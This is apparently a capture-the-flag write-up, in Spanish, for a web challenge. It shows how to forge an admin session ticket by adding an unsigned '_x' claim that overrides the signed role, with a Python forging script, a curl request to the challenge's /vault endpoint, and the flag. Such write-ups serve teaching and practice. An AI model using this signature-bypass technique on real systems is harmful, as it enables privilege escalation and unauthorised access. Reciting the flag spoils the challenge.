# [Web] Boleto chueco

## Descripción

El jaguar de papel también ruge.

<http://3.236.178.241:18080>

## Análisis

La página contiene un kiosco del Museo AHAU que permite registrar un nombre de visitante y obtener un ticket llamado AHSESS.

![Screenshot del reto](screenshot.png "Screenshot del reto")

También muestra un enlace hacia `/vault`, descrito como el archivo del curador, pero al intentar acceder con un ticket normal el servidor rechaza la solicitud.

Al registrar el usuario `hola`, obtuve el ticket:

```
AH1.eyJyIjoidXNlciIsInQiOjE3ODgxNTcxNzYsInUiOiJob2xhIn0.PEjxF0YksXdQVm6R8T7L81buUDviGt31MN6ABI2HdI8
```

El formato se parece a un JWT simplificado:

```
AH1.<payload>.<firma>
```

Al decodificar el payload de Base64URL obtenemos:

```json
{"r":"user","t":1788157176,"u":"hola"}
```

Por lo tanto, `r` corresponde al rol, `t` a un timestamp y `u` al usuario.

Para modificar el payload sin cambiar la firma, separé las tres partes del ticket, decodifiqué el payload en Base64URL, realicé los cambios y lo volví a codificar manteniendo la firma original. Intenté modificar directamente el rol a `admin`:

```json
{"r":"admin","t":1788157176,"u":"hola"}
```

pero el servidor respondió:

```json
{"detail":"bad signature","error":"invalid ticket"}
```

Lamentablemente, la firma sí protege los campos normales del ticket.

Revisando el JavaScript del cliente encontré `/static/ahsess.js`. La parte más interesante era la función `publicClaims`:

```javascript
function publicClaims(obj) {
  return Object.fromEntries(
    Object.entries(obj).filter(([k]) => !k.startsWith("_"))
  );
}
```

Esta función elimina cualquier propiedad cuyo nombre empiece con `_` antes de obtener los claims públicos. Para comprobar si estos campos privados estaban protegidos por la firma, añadí `_test` a un ticket válido sin recalcularla:

```json
{
  "r":"user",
  "t":1788157176,
  "u":"test",
  "_test":"hello"
}
```

Al enviarlo a `/vault`, el servidor no rechazó la firma:

```json
{
  "claims_seen_by_gatekeeper":{
    "_test":"hello",
    "r":"user",
    "t":1788157176,
    "u":"test"
  },
  "error":"forbidden",
  "message":"Welcome test. Role 'user' cannot view curator vault."
}
```

Con esto confirmé que los campos que empiezan con `_` no estaban incluidos en la información protegida por la firma.

Probé inicialmente campos como `_r`, `_role` y `_scope`, pero no modificaban el rol utilizado para autorizar la solicitud.

## Extracción

Después probé incluir un objeto dentro de un campo privado:

```json
{
  "r":"user",
  "t":1788157176,
  "u":"test",
  "_x":{
    "r":"admin"
  }
}
```

Esta vez la respuesta cambió y el servidor procesó la solicitud con el rol `admin`. Entonces, aunque `_x` no participaba en la firma, el servidor hacía flattening de sus propiedades con los claims normales. Como resultado, el `r` de `_x` sobrescribía el `r: "user"` que sí estaba firmado. De esta forma podíamos modificar el rol efectivo sin conocer la clave de firma.

Para generar el ticket modificado utilicé:

```python
import base64
import json

token = "AH1.eyJyIjoidXNlciIsInQiOjE3ODgxNTcxNzYsInUiOiJob2xhIn0.PEjxF0YksXdQVm6R8T7L81buUDviGt31MN6ABI2HdI8"

header, payload, signature = token.split(".")

def decode(value):
    return base64.urlsafe_b64decode(
        value + "=" * (-len(value) % 4)
    )

def encode(value):
    return base64.urlsafe_b64encode(value).rstrip(b"=").decode()

claims = json.loads(decode(payload))

claims["_x"] = {
    "r": "admin"
}

payload = encode(
    json.dumps(claims, separators=(",", ":")).encode()
)

print(f"{header}.{payload}.{signature}")
```

Esto me dio el nuevo ticket, `AH1.eyJyIjoidXNlciIsInQiOjE3ODgxNTcxNzYsInUiOiJob2xhIiwiX3giOnsiciI6ImFkbWluIn19.PEjxF0YksXdQVm6R8T7L81buUDviGt31MN6ABI2HdI8`. Probé enviarlo:

```bash
curl \
  -H 'Authorization: Bearer AH1.eyJyIjoidXNlciIsInQiOjE3ODgxNTcxNzYsInUiOiJob2xhIiwiX3giOnsiciI6ImFkbWluIn19.PEjxF0YksXdQVm6R8T7L81buUDviGt31MN6ABI2HdI8' \
  http://3.236.178.241:18080/vault
```

Con esto pudimos acceder al contenido del vault y obtener la flag.

## Flag

`AHAU{f1rm4s_un4_c0s4_l33s_0tr4_n0_3s_JWT}`
